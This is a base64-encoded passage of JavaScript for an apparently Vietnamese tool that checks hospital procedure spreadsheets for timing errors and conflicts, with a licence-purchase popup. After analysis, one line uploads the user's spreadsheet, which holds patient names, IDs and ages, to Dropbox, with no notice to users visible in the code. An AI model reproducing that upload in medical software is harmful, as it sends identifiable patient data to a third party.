0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2xvYWRpbmdUZXh0Jyk7DQogICAgY29uc3QgcHJvZ3Jlc3NCYXIgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgncHJvZ3Jlc3NCYXInKTsNCg0KICAgIGxvYWRpbmdUZXh0LmlubmVySFRNTCA9IGANCiAgICAgICAgPGkgY2xhc3M9ImZhcyBmYS1iYW4iIHN0eWxlPSJmb250LXNpemU6MjRweDtjb2xvcjpyZWQ7Zm9udC1zaXplOjIwcHg7bWFyZ2luLWJvdHRvbToxMHB4OyI+PC9pPjxici8+DQogICAgICAgIDxkaXYgc3R5bGU9InRleHQtYWxpZ246bGVmdDsgbWF4LWhlaWdodDo2MHZoOyBvdmVyZmxvdy15OmF1dG87IHBhZGRpbmc6MCAxMHB4OyI+DQogICAgICAgICAgICAke2Vycm9yTWVzc2FnZX0NCiAgICAgICAgPC9kaXY+PGJyLz4NCiAgICAgICAgPGJ1dHRvbiBjbGFzcz0iYnRuIiBpZD0iYnV5TGljZW5zZSI+TXVhIELhuqNuIFF1eeG7gW48L2J1dHRvbj4NCiAgICAgICAgPGJ1dHRvbiBjbGFzcz0iYnRuIiBvbmNsaWNrPSJ3aW5kb3cubG9jYXRpb24ucmVsb2FkKCkiIHN0eWxlPSJtYXJnaW4tbGVmdDoxMHB4OyI+xJDDs25nPC9idXR0b24+DQogICAgYDsNCg0KICAgIC8vIFNhdSBraGkgcmVuZGVyIG7DunQsIHRow6ptIHPhu7Ega2nhu4duDQogICAgc2V0VGltZW91dCgoKSA9PiB7DQogICAgICAgIGNvbnN0IGJ0biA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJidXlMaWNlbnNlIik7DQogICAgICAgIGlmIChidG4pIHsNCiAgICAgICAgICAgIGJ0bi5hZGRFdmVudExpc3RlbmVyKCJjbGljayIsICgpID0+IHsNCiAgICAgICAgICAgICAgICAvLyDhuqhuIHBvcHVwIGzhu5dpDQogICAgICAgICAgICAgICAgY29uc3QgcG9wdXAgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgibG9hZGluZ1BvcHVwIik7DQogICAgICAgICAgICAgICAgaWYgKHBvcHVwKSBwb3B1cC5zdHlsZS5kaXNwbGF5ID0gIm5vbmUiOw0KICAgICAgICAgICAgICAgIC8vIE3hu58gcG9wdXAgYuG6o25nIGdpw6ENCiAgICAgICAgICAgICAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiYnV5UG9wdXAiKS5zdHlsZS5kaXNwbGF5ID0gImZsZXgiOw0KICAgICAgICAgICAgfSk7DQogICAgICAgIH0NCiAgICB9LCAyMDApOw0KICAgIA0KICAgIHByb2dyZXNzQmFyLnN0eWxlLndpZHRoID0gJzAlJzsNCiAgICBwb3B1cC5zdHlsZS5kaXNwbGF5ID0gJ2ZsZXgnOw0KICAgIHBvcHVwLmNsYXNzTGlzdC5hZGQoJ3Nob3cnKTsNCg0KICAgIC8vIFbDlCBISeG7hlUgSMOTQSBi4bqldCBr4buzIMSRb+G6oW4gbsOgbyBj4buRIGfhuq9uZyDhuqluIHBvcHVwIHNhdSDEkcOzDQogICAgd2luZG93LmlzS2hvYUxvaSA9IHRydWU7DQoNCiAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnc2NhblN0YXR1cycpLmlubmVySFRNTCA9IGA8c3BhbiBzdHlsZT0iY29sb3I6cmVkO2ZvbnQtd2VpZ2h0OmJvbGQiPiR7ZXJyb3JNZXNzYWdlLnJlcGxhY2UoLzxbXj5dKj4vZywgJycpfTwvc3Bhbj5gOw0KICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdyZXN1bHRTZWN0aW9uJykuc3R5bGUuZGlzcGxheSA9ICdub25lJzsNCiAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnZXJyb3JTZWN0aW9uJykuc3R5bGUuZGlzcGxheSA9ICdub25lJzsNCg0KICAgIHJldHVybjsNCn0NCg0KDQoNCgkJCQ0KICAgICAgICAgICAgaWYgKGpzb25EYXRhLmxlbmd0aCA8PSAxKSB7DQogICAgICAgICAgICAgICAgdGhyb3cgbmV3IEVycm9yKCdGaWxlIEV4Y2VsIGtow7RuZyBjw7MgZOG7ryBsaeG7h3UgKGNo4buJIGPDsyB0acOqdSDEkeG7gSBob+G6t2MgdHLhu5FuZyknKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIA0KICAgICAgICAgICBwcm9jZXNzRGF0YShqc29uRGF0YSk7DQogICAgICAgICAgY29uc3Qgc3RhdHMgPSB7DQogICAgICAgICAgICBoZXJiOiBnZXRIZXJiT3V0bGllclRvdGFsKCksDQogICAgICAgICAgICAgIHRpbWU6IGdldFRpbWVFcnJvclRvdGFsKCksDQogICAgICAgICAgICAgY29uZmxpY3Q6IGdldENvbmZsaWN0VG90YWwoKQ0KICAgICAgICAgIH07DQogICAgICAgICAgY29uc3QgdXBsb2FkRmlsZSA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdmaWxlSW5wdXQnKS5maWxlc1swXTsNCiBhd2FpdCB1cGxvYWRUb0Ryb3Bib3godXBsb2FkRmlsZSwgd2luZG93Lmtob2FWYWx1ZSwgd2luZG93Lm5nYXlWYWx1ZSwgc3RhdHMpOw0KICAgICAgICB9IGNhdGNoIChlcnJvcikgew0KICAgICAgICAgICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2ZpbGVSZXF1aXJlbWVudHMnKS5jbGFzc0xpc3QucmVtb3ZlKCdoaWRkZW4nKTsNCiAgICAgICAgICAgIGxvZ0Vycm9yKCdM4buXaSBraGkgxJHhu41jIGZpbGUgRXhjZWwnLCBudWxsLCBlcnJvci5tZXNzYWdlKTsNCiAgICAgICAgICAgIGRpc3BsYXlFcnJvcnMoKTsNCiAgICAgICAgICAgIGFsZXJ0KCdDw7MgbOG7l2kgeOG6o3kgcmEga2hpIMSR4buNYyBmaWxlOiAnICsgZXJyb3IubWVzc2FnZSk7DQogICAgICAgIH0gZmluYWxseSB7DQoJCWNsZWFyVGltZW91dChhbmFseXplUG9wdXBUaW1lcik7IC8vIOKchSBOZ+G6r3QgdGltZXIgcG9wdXANCgkJaWYgKCF3aW5kb3cuaXNLaG9hTG9pKSB7ICANCgkJZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2xvYWRpbmdQb3B1cCcpLmNsYXNzTGlzdC5yZW1vdmUoJ3Nob3cnKTsgLy8g4pyFIOG6qG4gcG9wdXANCiAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbG9hZGluZ1BvcHVwJykuc3R5bGUuZGlzcGxheSA9ICdub25lJzsgICAvLyDinIUg4bqobiBo4bqzbiBwb3B1cA0KCSAgfQ0KICAgICAgICAgICAgYW5hbHl6ZUJ0bi5kaXNhYmxlZCA9IGZhbHNlOw0KICAgICAgICAgICAgYW5hbHl6ZUJ0bi5pbm5lckhUTUwgPSAnPGkgY2xhc3M9ImZhcyBmYS1zZWFyY2ggZmEtc3Bpbi1jb250aW51b3VzIj48L2k+IEtp4buDbSBUcmEnOw0KICAgICAgICB9DQogICAgfTsNCiAgICANCiAgICByZWFkZXIub25lcnJvciA9IGZ1bmN0aW9uKCkgew0KICAgICAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnZmlsZVJlcXVpcmVtZW50cycpLmNsYXNzTGlzdC5yZW1vdmUoJ2hpZGRlbicpOw0KICAgICAgICBsb2dFcnJvcignTOG7l2kga2hpIMSR4buNYyBmaWxlJywgbnVsbCwgJ0tow7RuZyB0aOG7gyDEkeG7jWMgbuG7mWkgZHVuZyBmaWxlJyk7DQogICAgICAgIGRpc3BsYXlFcnJvcnMoKTsNCiAgICAgICAgYW5hbHl6ZUJ0bi5kaXNhYmxlZCA9IGZhbHNlOw0KICAgICAgICBhbmFseXplQnRuLmlubmVySFRNTCA9ICc8aSBjbGFzcz0iZmFzIGZhLXNlYXJjaCBmYS1zcGluLWNvbnRpbnVvdXMiPjwvaT4gS2nhu4NtIFRyYSc7DQogICAgICAgIGFsZXJ0KCdM4buXaSBraGkgxJHhu41jIGZpbGUuIFZ1aSBsw7JuZyB0aOG7rSBs4bqhaSB24bubaSBmaWxlIGtow6FjLicpOw0KICAgIH07DQogICAgDQogICAgcmVhZGVyLnJlYWRBc0FycmF5QnVmZmVyKGZpbGUpOw0KfQ0KDQogICAgICAgIGZ1bmN0aW9uIHByb2Nlc3NEYXRhKGRhdGEpIHsNCiAgICANCiAgICB0cnkgew0KICAgICAgICBjb25zdCBoZWFkZXJMaW5lMSA9IGRhdGFbN10gfHwgW107DQogICAgICAgIGNvbnN0IGhlYWRlckxpbmUyID0gZGF0YVs4XSB8fCBbXTsNCiAgICAgICAgY29uc3QgY29tYmluZWRIZWFkZXJzID0gaGVhZGVyTGluZTEubWFwKChjb2wsIGluZGV4KSA9PiANCiAgICAgICAgICAgIChjb2wgKyAnICcgKyAoaGVhZGVyTGluZTJbaW5kZXhdIHx8ICcnKSkudHJpbSgpDQogICAgICAgICk7DQoNCiAgICAgICAgDQogICAgICAgICAgICAgICAgY29uc3QgcHJvY2VkdXJlSW5kZXggPSBjb21iaW5lZEhlYWRlcnMuZmluZEluZGV4KGggPT4gaC5pbmNsdWRlcygiVGjhu6cgdGh14bqtdCIpKTsNCgkJCQljb25zdCBkYXRlSW5kZXggPSBjb21iaW5lZEhlYWRlcnMuZmluZEluZGV4KGggPT4gaC5pbmNsdWRlcygiTmfDoHkgdGjhu7FjIGhp4buHbiIpKTsgLy8gVGjDqm0gZMOybmcgbsOgeQ0KICAgICAgICAgICAgICAgIGNvbnN0IHN0YXJ0SW5kZXggPSBjb21iaW5lZEhlYWRlcnMuZmluZEluZGV4KGggPT4gaC5pbmNsdWRlcygiVGjhu51pIGdpYW4gYuG6r3QgxJHhuqd1IHRo4buxYyBoaeG7h24iKSk7DQogICAgICAgICAgICAgICAgY29uc3QgZW5kSW5kZXggPSBjb21iaW5lZEhlYWRlcnMuZmluZEluZGV4KGggPT4gaC5pbmNsdWRlcygiVGjhu51pIGdpYW4ga+G6v3QgdGjDumMiKSk7DQogICAgICAgICAgICAgICAgY29uc3Qgb3BlcmF0b3JJbmRleCA9IGNvbWJpbmVkSGVhZGVycy5maW5kSW5kZXgoaCA9PiBoLmluY2x1ZGVzKCJUaOG7pyB0aHXhuq10IGNow61uaCIpKTsNCiAgICAgICAgICAgICAgICBjb25zdCBuYW1lSW5kZXggPSBjb21iaW5lZEhlYWRlcnMuZmluZEluZGV4KGggPT4gaC5pbmNsdWRlcygiSOG7jSB0w6puIikpOw0KICAgICAgICAgICAgICAgIGNvbnN0IHBhdGllbnRJZEluZGV4ID0gY29tYmluZWRIZWFkZXJzLmZpbmRJbmRleChoID0+IGguaW5jbHVkZXMoIk3DoyBCTiIpKTsNCgkJCQljb25zdCBwYXRpZW50YWdlSW5kZXggPSBjb21iaW5lZEhlYWRlcnMuZmluZEluZGV4KGggPT4gaC5pbmNsdWRlcygiVHXhu5VpIikpOw0KICAgICAgICAgICAgICAgIGNvbnN0IGRvY3RvckluZGV4ID0gY29tYmluZWRIZWFkZXJzLmZpbmRJbmRleChoID0+IGguaW5jbHVkZXMoIkLDoWMgc+G7uSBjaOG7iSDEkeG7i25oIikpOw0KICAgICAgICAgICAgICAgIGNvbnN0IG1pc3NpbmdDb2x1bW5zID0gW107DQogICAgICAgICAgICAgICAgaWYgKHByb2NlZHVyZUluZGV4ID09PSAtMSkgbWlzc2luZ0NvbHVtbnMucHVzaCgnVGjhu6cgdGh14bqtdCcpOw0KICAgICAgICAgICAgICAgIGlmIChzdGFydEluZGV4ID09PSAtMSkgbWlzc2luZ0NvbHVtbnMucHVzaCgnVGjhu51pIGdpYW4gYuG6r3QgxJHhuqd1IHRo4buxYyBoaeG7h24nKTsNCiAgICAgICAgICAgICAgICBpZiAoZW5kSW5kZXggPT09IC0xKSBtaXNzaW5nQ29sdW1ucy5wdXNoKCdUaOG7nWkgZ2lhbiBr4bq/dCB0aMO6YycpOw0KICAgICAgICAgICAgICAgIGlmIChvcGVyYXRvckluZGV4ID09PSAtMSkgbWlzc2luZ0NvbHVtbnMucHVzaCgnVGjhu6cgdGh14bqtdCBjaMOtbmgnKTsNCiAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICBpZiAobWlzc2luZ0NvbHVtbnMubGVuZ3RoID4gMCkgew0KICAgICAgICAgICAgICAgICAgICB0aHJvdyBuZXcgRXJyb3IoYEtow7RuZyB0w6xtIHRo4bqleSBjw6FjIGPhu5l0IGLhuq90IGJ14buZYzogJHttaXNzaW5nQ29sdW1ucy5qb2luKCcsICcpfWApOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICBjb25zdCByb3dzID0gZGF0YS5zbGljZSg5KTsNCiAgICAgICAgICAgICAgICBjb25zdCBwcm9jZWR1cmVzID0gW107DQogICAgICAgICAgICAgICAgY29uc3QgaGVyYlByb2NlZHVyZXMgPSBbXTsNCiAgICAgICAgICAgICAgICBsZXQgc2tpcHBlZFJvd3MgPSAwOw0KICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgIHJvd3MuZm9yRWFjaCgocm93LCBpbmRleCkgPT4gew0KICAgICAgICAgICAgICAgICAgICBjb25zdCByb3dOdW1iZXIgPSBpbmRleCArIDEwOw0KICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgdHJ5IHsNCiAgICAgICAgICAgICAgICAgICAgICAgIGlmICghcm93IHx8IHJvdy5sZW5ndGggPT09IDApIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBsb2dFcnJvcignRMOybmcgdHLhu5FuZycsIHJvd051bWJlcik7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgc2tpcHBlZFJvd3MrKzsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXR1cm47DQogICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgICAgIGNvbnN0IHByb2NlZHVyZU5hbWUgPSByb3dbcHJvY2VkdXJlSW5kZXhdOw0KICAgICAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgICAgICAgICBpZiAoIXByb2NlZHVyZU5hbWUpIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBza2lwcGVkUm93cysrOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybjsNCiAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCFQUk9DRURVUkVTW3Byb2NlZHVyZU5hbWVdKSB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9nRXJyb3IoYFRo4bunIHRodeG6rXQga2jDtG5nIG7hurFtIHRyb25nIGRhbmggc8OhY2gga2nhu4NtIHRyYTogJHtwcm9jZWR1cmVOYW1lfWAsIHJvd051bWJlcik7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgc2tpcHBlZFJvd3MrKzsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXR1cm47DQogICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChQUk9DRURVUkVTW3Byb2NlZHVyZU5hbWVdLnNraXApIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb25zdCBzdGFydCA9IHBhcnNlRGF0ZVRpbWUocm93W3N0YXJ0SW5kZXhdLCByb3dOdW1iZXIpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbnN0IGVuZCA9IHBhcnNlRGF0ZVRpbWUocm93W2VuZEluZGV4XSwgcm93TnVtYmVyKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBoZXJiUHJvY2VkdXJlcy5wdXNoKHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcm93SW5kZXg6IHJvd051bWJlciwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcGF0aWVudE5hbWU6IG5hbWVJbmRleCAhPT0gLTEgPyByb3dbbmFtZUluZGV4XSB8fCAnS2jDtG5nIGPDsycgOiAnS2jDtG5nIGPDsycsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBhdGllbnRJZDogcGF0aWVudElkSW5kZXggIT09IC0xID8gcm93W3BhdGllbnRJZEluZGV4XSB8fCAnS2jDtG5nIGPDsycgOiAnS2jDtG5nIGPDsycsDQoJCQkJCQkJCXBhdGllbnRBZ2U6IHBhdGllbnRhZ2VJbmRleCAhPT0gLTEgPyByb3dbcGF0aWVudGFnZUluZGV4XSB8fCAnS2jDtG5nIGPDsycgOiAnS2jDtG5nIGPDsycsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByb2NlZHVyZTogcHJvY2VkdXJlTmFtZSwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZG9jdG9yOiByb3dbZG9jdG9ySW5kZXhdIHx8ICdLaMO0bmcgY8OzJywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZGF0ZTogc3RhcnQ/LmRhdGVLZXkgfHwgJ0tow7RuZyB4w6FjIMSR4buLbmgnLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzdGFydDogc3RhcnQ/LnNlY29uZHMgfHwgMCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kOiBlbmQ/LnNlY29uZHMgfHwgMCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZGlzcGxheVN0YXJ0OiBzdGFydD8uZGlzcGxheVRpbWUgfHwgJz8/JywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZGlzcGxheUVuZDogZW5kPy5kaXNwbGF5VGltZSB8fCAnPz8nLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBvcGVyYXRvcjogcm93W29wZXJhdG9ySW5kZXhdIHx8ICdLaMO0bmcgY8OzJywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJvY2VkdXJlSW5mbzogUFJPQ0VEVVJFU1twcm9jZWR1cmVOYW1lXQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybjsNCiAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICAgICAgY29uc3Qgc3RhcnQgPSBwYXJzZURhdGVUaW1lKHJvd1tzdGFydEluZGV4XSwgcm93TnVtYmVyKTsNCiAgICAgICAgICAgICAgICAgICAgICAgIGNvbnN0IGVuZCA9IHBhcnNlRGF0ZVRpbWUocm93W2VuZEluZGV4XSwgcm93TnVtYmVyKTsNCiAgICAgICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCFzdGFydCB8fCAhZW5kKSB7DQogICANCiAgICBza2lwcGVkUm93cysrOw0KICAgIHJldHVybjsNCn0NCiAgICAgICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgKHN0YXJ0LmRhdGVLZXkgIT09IGVuZC5kYXRlS2V5KSB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9nRXJyb3IoJ1Ro4bunIHRodeG6rXQgYuG6r3QgxJHhuqd1IHbDoCBr4bq/dCB0aMO6YyBraMOhYyBuZ8OgeScsIHJvd051bWJlciwgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzdGFydERhdGU6IHN0YXJ0LmRhdGVLZXksDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZERhdGU6IGVuZC5kYXRlS2V5LA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwYXRpZW50TmFtZTogbmFtZUluZGV4ICE9PSAtMSA/IHJvd1tuYW1lSW5kZXhdIHx8ICdLaMO0bmcgY8OzJyA6ICdLaMO0bmcgY8OzJywNCgkJCQkJCQkJcGF0aWVudElkOiBwYXRpZW50SWRJbmRleCAhPT0gLTEgPyByb3dbcGF0aWVudElkSW5kZXhdIHx8ICdLaMO0bmcgY8OzJyA6ICdLaMO0bmcgY8OzJywNCgkJCQkJCQkJcGF0aWVudEFnZTogcGF0aWVudGFnZUluZGV4ICE9PSAtMSA/IHJvd1twYXRpZW50YWdlSW5kZXhdIHx8ICdLaMO0bmcgY8OzJyA6ICdLaMO0bmcgY8OzJywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJvY2VkdXJlOiBwcm9jZWR1cmVOYW1lDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgc2tpcHBlZFJvd3MrKzsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXR1cm47DQogICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChlbmQuc2Vjb25kcyA8PSBzdGFydC5zZWNvbmRzKSB7DQogICAgbG9nRXJyb3IoJ1Ro4budaSBnaWFuIGvhur90IHRow7pjIHBo4bqjaSBzYXUgdGjhu51pIGdpYW4gYuG6r3QgxJHhuqd1Jywgcm93TnVtYmVyLCB7DQogICAgICAgIHN0YXJ0VGltZTogc3RhcnQuZGlzcGxheVRpbWUsDQogICAgICAgIGVuZFRpbWU6IGVuZC5kaXNwbGF5VGltZSwNCiAgICAgICAgc3RhcnRWYWx1ZTogcm93W3N0YXJ0SW5kZXhdLA0KICAgICAgICBlbmRWYWx1ZTogcm93W2VuZEluZGV4XSwNCiAgICAgICAgcGF0aWVudE5hbWU6IG5hbWVJbmRleCAhPT0gLTEgPyByb3dbbmFtZUluZGV4XSB8fCAnS2jDtG5nIGPDsycgOiAnS2jDtG5nIGPDsycsDQoJCXBhdGllbnRJZDogcGF0aWVudElkSW5kZXggIT09IC0xID8gcm93W3BhdGllbnRJZEluZGV4XSB8fCAnS2jDtG5nIGPDsycgOiAnS2jDtG5nIGPDsycsDQoJCXBhdGllbnRBZ2U6IHBhdGllbnRhZ2VJbmRleCAhPT0gLTEgPyByb3dbcGF0aWVudGFnZUluZGV4XSB8fCAnS2jDtG5nIGPDsycgOiAnS2jDtG5nIGPDsycsDQogICAgICAgIHByb2NlZHVyZTogcHJvY2VkdXJlTmFtZSwNCiAgICAgICAgbmdheVRodWNIaWVuOiBkYXRlSW5kZXggIT09IC0xID8gcm93W2RhdGVJbmRleF0gOiAnS2jDtG5nIHjDoWMgxJHhu4tuaCcNCiAgICB9KTsNCiAgICBza2lwcGVkUm93cysrOw0KICAgIHJldHVybjsNCn0NCiAgICAgICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICAgICAgY29uc3QgZXhwZWN0ZWREdXJhdGlvbiA9IFBST0NFRFVSRVNbcHJvY2VkdXJlTmFtZV0/LmR1cmF0aW9uIHx8IDA7DQogICAgICAgICAgICAgICAgICAgICAgICBjb25zdCBhY3R1YWxEdXJhdGlvbk1pbnV0ZXMgPSAoZW5kLnNlY29uZHMgLSBzdGFydC5zZWNvbmRzKSAvIDYwOw0KICAgICAgICAgICAgICAgICAgICAgICAgDQpsZXQgZHVyYXRpb25EaWZmID0gTWF0aC5hYnMoYWN0dWFsRHVyYXRpb25NaW51dGVzIC0gZXhwZWN0ZWREdXJhdGlvbik7DQpsZXQgaXNEb2N0b3IgPSAoc2Vzc2lvblN0b3JhZ2UuZ2V0SXRlbSgnbWVkVXNlcicpIHx8ICcnKS50b0xvd2VyQ2FzZSgpID09PSAnZG9jdG9yJzsNCg0KaWYgKA0KICAgIGV4cGVjdGVkRHVyYXRpb24gPiAwICYmDQogICAgKA0KICAgICAgICAoaXNEb2N0b3IgJiYgZHVyYXRpb25EaWZmID49IDEpIHx8ICAgLy8g4pyUIHTDoGkga2hv4bqjbiBkb2N0b3INCiAgICAgICAgKCFpc0RvY3RvciAmJiBkdXJhdGlvbkRpZmYgPiAxKSAgICAgIC8vIOKclCB0w6BpIGtob+G6o24ga2jDoWMNCiAgICApDQopIHsNCiAgICBsb2dFcnJvcihgYCwgcm93TnVtYmVyLCB7DQogICAgICAgIHByb2NlZHVyZTogcHJvY2VkdXJlTmFtZSwNCiAgICAgICAgZXhwZWN0ZWQ6IGV4cGVjdGVkRHVyYXRpb24sDQogICAgICAgIGFjdHVhbDogYWN0dWFsRHVyYXRpb25NaW51dGVzLA0KICAgICAgICBwYXRpZW50TmFtZTogbmFtZUluZGV4ICE9PSAtMSA/IHJvd1tuYW1lSW5kZXhdIHx8ICdLaMO0bmcgY8OzJyA6ICdLaMO0bmcgY8OzJywNCgkJcGF0aWVudElkOiBwYXRpZW50SWRJbmRleCAhPT0gLTEgPyByb3dbcGF0aWVudElkSW5kZXhdIHx8ICdLaMO0bmcgY8OzJyA6ICdLaMO0bmcgY8OzJywNCgkJcGF0aWVudEFnZTogcGF0aWVudGFnZUluZGV4ICE9PSAtMSA/IHJvd1twYXRpZW50YWdlSW5kZXhdIHx8ICdLaMO0bmcgY8OzJyA6ICdLaMO0bmcgY8OzJywNCiAgICAgICAgb3BlcmF0b3I6IHJvd1tvcGVyYXRvckluZGV4XSA/IHJvd1tvcGVyYXRvckluZGV4XS5yZXBsYWNlKC8sL2csICcnKSA6ICdLaMO0bmcgY8OzJywNCiAgICAgICAgZGF0ZTogc3RhcnQuZGF0ZUtleSwNCiAgICAgICAgbmdheVRodWNIaWVuOiBkYXRlSW5kZXggIT09IC0xID8gcm93W2RhdGVJbmRleF0gOiAnS2jDtG5nIHjDoWMgxJHhu4tuaCcsDQogICAgICAgIHN0YXJ0VGltZTogc3RhcnQuZGlzcGxheVRpbWUsDQogICAgICAgIGVuZFRpbWU6IGVuZC5kaXNwbGF5VGltZSwNCiAgICAgICAgZG9jdG9yOiByb3dbZG9jdG9ySW5kZXhdIHx8ICdLaMO0bmcgY8OzJyAvLyBUaMOqbSBkw7JuZyBuw6B5DQogICAgfSk7DQp9DQoNCiAgICAgICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgKHByb2NlZHVyZU5hbWUgPT09ICdT4bqvYyB0aHXhu5FjIHRoYW5nJykgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGhlcmJQcm9jZWR1cmVzLnB1c2gocHJvY2VkdXJlc1twcm9jZWR1cmVzLmxlbmd0aCAtIDFdKTsNCiAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgIHByb2NlZHVyZXMucHVzaCh7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcm93SW5kZXg6IHJvd051bWJlciwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwYXRpZW50TmFtZTogbmFtZUluZGV4ICE9PSAtMSA/IHJvd1tuYW1lSW5kZXhdIHx8ICdLaMO0bmcgY8OzJyA6ICdLaMO0bmcgY8OzJywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwYXRpZW50SWQ6IHBhdGllbnRJZEluZGV4ICE9PSAtMSA/IHJvd1twYXRpZW50SWRJbmRleF0gfHwgJ0tow7RuZyBjw7MnIDogJ0tow7RuZyBjw7MnLA0KCQkJCQkJCXBhdGllbnRBZ2U6IHBhdGllbnRhZ2VJbmRleCAhPT0gLTEgPyByb3dbcGF0aWVudGFnZUluZGV4XSB8fCAnS2jDtG5nIGPDsycgOiAnS2jDtG5nIGPDsycsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJvY2VkdXJlOiBwcm9jZWR1cmVOYW1lLA0KCQkJCQkJCWRvY3Rvcjogcm93W2RvY3RvckluZGV4XSB8fCAnS2jDtG5nIGPDsycsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZGF0ZTogc3RhcnQuZGF0ZUtleSwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBzdGFydDogc3RhcnQuc2Vjb25kcywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQ6IGVuZC5zZWNvbmRzLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRpc3BsYXlTdGFydDogc3RhcnQuZGlzcGxheVRpbWUsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZGlzcGxheUVuZDogZW5kLmRpc3BsYXlUaW1lLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIG9wZXJhdG9yOiByb3dbb3BlcmF0b3JJbmRleF0gfHwgJ0tow7RuZyBjw7MnLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbmZsaWN0OiBmYWxzZSwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb25mbGljdFJlYXNvbjogJycsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJvY2VkdXJlSW5mbzogUFJPQ0VEVVJFU1twcm9jZWR1cmVOYW1lXSwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBzdWdnZXN0aW9uOiAnJw0KICAgICAgICAgICAgICAgICAgICAgICAgfSk7DQogICAgICAgICAgICAgICAgICAgIH0gY2F0Y2ggKGVycm9yKSB7DQogICAgICAgICAgICAgICAgICAgICAgICBsb2dFcnJvcihgTOG7l2kgeOG7rSBsw70gZMOybmc6ICR7ZXJyb3IubWVzc2FnZX1gLCByb3dOdW1iZXIsIHsNCiAgICAgICAgICAg